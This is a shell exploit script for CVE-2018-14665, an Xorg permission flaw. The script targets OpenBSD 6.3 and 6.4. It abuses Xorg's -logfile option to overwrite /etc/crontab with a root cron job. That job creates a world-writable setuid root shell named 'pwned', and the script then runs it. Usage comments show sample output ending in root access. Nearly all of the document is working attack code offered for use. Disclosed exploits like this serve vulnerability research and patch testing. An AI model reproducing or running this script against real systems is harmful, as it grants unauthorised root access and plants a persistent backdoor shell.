#!/bin/sh

#
# raptor_xorgasm - xorg-x11-server LPE via OpenBSD's cron
# Copyright (c) 2018 Marco Ivaldi <raptor@0xdeadbeef.info>
#
# A flaw was found in xorg-x11-server before 1.20.3. An incorrect permission 
# check for -modulepath and -logfile options when starting Xorg. X server 
# allows unprivileged users with the ability to log in to the system via 
# physical console to escalate their privileges and run arbitrary code under 
# root privileges (CVE-2018-14665).
#
# This exploit targets OpenBSD's cron in order to escalate privileges to
# root on OpenBSD 6.3 and 6.4. You don't need to be connected to a physical
# console, it works perfectly on pseudo-terminals connected via SSH as well.
#
# See also:
# https://lists.x.org/archives/xorg-announce/2018-October/002927.html
# https://www.exploit-db.com/exploits/45697/
# https://gist.github.com/0x27/d8aae5de44ed385ff2a3d80196907850
#
# Usage:
# blobfish$ chmod +x raptor_xorgasm
# blobfish$ ./raptor_xorgasm
# [...]
# Be patient for a couple of minutes...
# [...]
# Don't forget to cleanup and run crontab -e to reload the crontab.
# -rw-r--r--  1 root  wheel  47327 Oct 27 14:48 /etc/crontab
# -rwsrwxrwx  1 root  wheel  7417 Oct 27 14:50 /usr/local/bin/pwned
# blobfish# id
# uid=0(root) gid=0(wheel) groups=1000(raptor), 0(wheel)
#
# Vulnerable platforms (setuid Xorg 1.19.0 - 1.20.2):
# OpenBSD 6.4 (Xorg 1.19.6) [tested]
# OpenBSD 6.3 (Xorg 1.19.6) [tested]
#

echo "raptor_xorgasm - xorg-x11-server LPE via OpenBSD's cron"
echo "Copyright (c) 2018 Marco Ivaldi <raptor@0xdeadbeef.info>"

# prepare the payload
cat << EOF > /tmp/xorgasm
cp /bin/sh /usr/local/bin/pwned # fallback in case gcc is not available
echo "main(){setuid(0);setgid(0);system(\"/bin/sh\");}" > /tmp/pwned.c
gcc /tmp/pwned.c -o /usr/local/bin/pwned # most dirs are mounted nosuid
chmod 4777 /usr/local/bin/pwned
EOF
chmod +x /tmp/xorgasm

# trigger the bug
cd /etc
Xorg -fp "* * * * * root /tmp/xorgasm" -logfile crontab :1 &
sleep 5
pkill Xorg

# run the setuid shell
echo
echo "Be patient for a couple of minutes..."
echo
sleep 120
echo
echo "Don't forget to cleanup and run crontab -e to reload the crontab."
ls -l /etc/crontab*
ls -l /usr/local/bin/pwned
/usr/local/bin/pwned